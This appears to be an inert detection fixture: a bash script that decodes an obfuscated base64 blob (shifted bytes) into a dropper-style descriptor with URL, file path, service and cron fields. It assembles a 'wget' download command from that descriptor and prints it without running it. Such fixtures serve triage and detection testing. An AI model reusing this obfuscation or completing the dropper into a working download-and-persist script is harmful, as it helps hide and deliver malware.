#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_345d50c7='hEs/ioGCc36BS29xf4N3gHNtgHN7fYJzOoWAd4JzbXR3enOKb3JvfoJzgEuFdXOCbX2Dgn6DgoqBgm91c21xfYN8gks/inFve35vd3V8bXdyS3Fve35vd3V8O0NAP3BAdEJFQUOKg4B6S3aCgn6BSD09Q0A/cEB0QkVBQzxzhm97fnpzPHd8hG96d3I9REdxP0dxP0E8gXaKg4FzgG1vdXN8gktWg3yCgHOBgVpvcD1DQD9wQHRCRUFDinR3enNtfm+Cdks9gnt+PXaDfIKAc4GBO3FvcXZzPTyBgm91cztDQD9wQHRCRUFD'

readonly Codec_345d50c7='base64_literal|add_modulo_256|0e'



Load_345d50c7() {

  v_a19c=()

  local v_f602

  while read -r v_f602; do [[ -n "$v_f602" ]] && v_a19c+=("$v_f602"); done < <(printf '%s' "${Material_345d50c7}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')

}



Decode_345d50c7() {

  v_b27e=()

  local v_e598

  for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do

    v_b27e+=("$(((v_a19c[v_e598] - 14 + 256) % 256))")

  done

}



Recover_345d50c7() {

  local -a v_a19c v_b27e

  local v_c304 v_d41a v_b803 v_e598

  local -a series=(3 5 8 13); v_d41a="${series[*]:1:2}"

  Load_345d50c7

  case 1 in 1) Decode_345d50c7 ;; *) return 70 ;; esac

  v_c304=''

  local octal character

  for v_e598 in "${!v_b27e[@]}"; do

    printf -v octal '%03o' "${v_b27e[v_e598]}"

    printf -v character '%b' "\\$octal"

    v_c304+="$character"

  done

  printf '%s\n' "$v_c304"

}



Inspect_345d50c7() { local recovered; recovered="$(Recover_345d50c7)"; printf '%s\n' "$recovered"; }



Plan_345d50c7() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_345d50c7)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a request_command=(wget -qO "$file_path" "$url")

  declare -p request_command

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_345d50c7; fi

